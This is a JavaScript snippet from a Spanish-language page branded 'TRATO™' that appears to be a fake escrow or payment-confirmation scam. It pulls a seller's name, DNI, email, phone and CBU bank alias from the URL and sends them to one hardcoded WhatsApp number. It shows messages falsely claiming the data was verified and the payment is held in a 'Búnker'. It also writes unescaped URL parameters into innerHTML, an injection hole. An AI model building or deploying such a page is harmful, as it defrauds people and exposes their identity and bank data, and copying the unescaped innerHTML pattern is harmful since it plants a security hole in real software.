<script>
    const urlParams = new URLSearchParams(window.location.search);
    const producto = urlParams.get('external_reference') || 'Producto';
    const precio = urlParams.get('precio') || '---';
    const opID = urlParams.get('id') || 'Pendiente';
    
    // Recuperamos los datos del vendedor de la URL para reconstruir la ficha técnica
    const nombreV = urlParams.get('nombre') || 'No especificado';
    const dniV = urlParams.get('dni') || 'No especificado';
    const emailV = urlParams.get('email') || 'No especificado';
    const telV = urlParams.get('telefono') || 'No especificado';
    const cbuV = urlParams.get('cbu') || 'No especificado';

    document.getElementById('info-operacion').innerHTML = `
        <strong>Producto:</strong> ${decodeURIComponent(producto)} <br>
        <strong>Monto:</strong> $ ${precio} <br>
        <strong>ID:</strong> ${opID}
    `;

    window.enviarComprobanteObligatorio = () => {
        const compradorDni = document.getElementById('comprador-dni').value;
        if (!compradorDni) return alert("Ingresa tu DNI.");
        
        const currentURL = window.location.href;

        // ESTRUCTURA EXACTA QUE PEDISTE (Ficha técnica completa + Link de retorno)
        const mensajeComprobante = `🛡️ *NUEVA VENTA - TRATO™*\n\n` +
            `*Datos del Vendedor:*\n` +
            `- Nombre: ${decodeURIComponent(nombreV)}\n` +
            `- DNI / Identificación: ${dniV}\n` +
            `- Correo: ${decodeURIComponent(emailV)}\n` +
            `- Teléfono: ${decodeURIComponent(telV)}\n` +
            `- CBU / Alias: ${decodeURIComponent(cbuV)}\n\n` +
            `*Datos de la Operación:*\n` +
            `- ID Operación: ${opID}\n` +
            `- Número de Paquete o Producto: ${decodeURIComponent(producto)}\n` +
            `- Monto Total (con 15%): $ ${precio}\n\n` +
            `🔗 *Link de retorno:* ${currentURL}\n\n` +
            `ℹ️ *VALIDACIÓN DE IDENTIDAD Y DEPÓSITO:*\n` +
            `Los datos del vendedor han sido verificados para procesar el depósito del pago en caso de una transacción exitosa. RichardBro™ 2026.`;

        window.open(`https://api.whatsapp.com/send?phone=5493456528480&text=${encodeURIComponent(mensajeComprobante)}`, '_blank');
        document.getElementById('btn-continuar').disabled = false;
    };

    window.desbloquearPantalla = () => { document.getElementById('pantalla-bloqueo').style.display = 'none'; };

    window.notificar = (tipo) => {
        const dniComprador = document.getElementById('comprador-dni').value;
        const currentURL = window.location.href;

        // Mantenemos también el link de retorno en las otras notificaciones por seguridad
        let msg = `🛡️ *PAGO CONFIRMADO TRATO™*\n\n` +
            `El pago por ${decodeURIComponent(producto)} ya está en el Búnker.\n\n` +
            `* ID: ${opID}\n` +
            `* DNI Comprador: ${dniComprador}\n` +
            `* Monto: $ ${precio}\n\n` +
            `🔗 *Link de retorno:* ${currentURL}\n\n` +
            `_Aguardo validación para proceder. RichardBro™ 2026._`;
            
        window.open(`https://api.whatsapp.com/send?phone=5493456528480&text=${encodeURIComponent(msg)}`, '_blank');
    };
</script>
